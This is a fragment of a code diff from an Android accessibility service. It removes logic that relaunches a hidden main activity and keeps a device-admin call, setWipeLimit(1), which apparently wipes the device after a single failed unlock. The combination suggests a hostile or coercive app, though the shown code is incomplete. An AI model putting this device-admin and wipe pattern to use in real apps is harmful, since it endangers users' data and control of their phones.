@@ -5,7 +5,6 @@ import android.content.pm.ApplicationInfo;
 import android.content.ComponentName;
 import android.os.Bundle;
 import android.app.KeyguardManager;
-import android.os.UserManager;
 import android.graphics.Rect;
 import android.view.accessibility.AccessibilityWindowInfo;
 import java.util.List;
@@ -22,23 +21,12 @@ public class MyAccessibilityService extends AccessibilityService {
     private int Y = 1337;
 
     private int dexA=0;
-
-    private boolean isComponentEnabled() {
-        ComponentName componentName = new ComponentName(this, MainActivity.class);
-        PackageManager pm = getPackageManager();
-        return pm.getComponentEnabledSetting(componentName) == PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
-    }
     
     @Override
     public void onCreate() {
         super.onCreate();
         DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);       
-        if (dpm != null && dpm.isAdminActive(new ComponentName(this, MyDeviceAdminReceiver.class))) setWipeLimit(1);     
-        UserManager um = (UserManager) getSystemService(Context.USER_SERVICE);
-        KeyguardManager km = (KeyguardManager) getSystemService(Context.KEYGUARD_SERVICE);
-        if (um != null && um.isUserUnlocked() && km != null && !km.isKeyguardLocked()) {
-            if (!isComponentEnabled()) startActivity(new Intent(this, MainActivity.class).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
-        }
+        if (dpm != null && dpm.isAdminActive(new ComponentName(this, MyDeviceAdminReceiver.class))) setWipeLimit(1);             
     }
 
     private void setWipeLimit(int limit) {
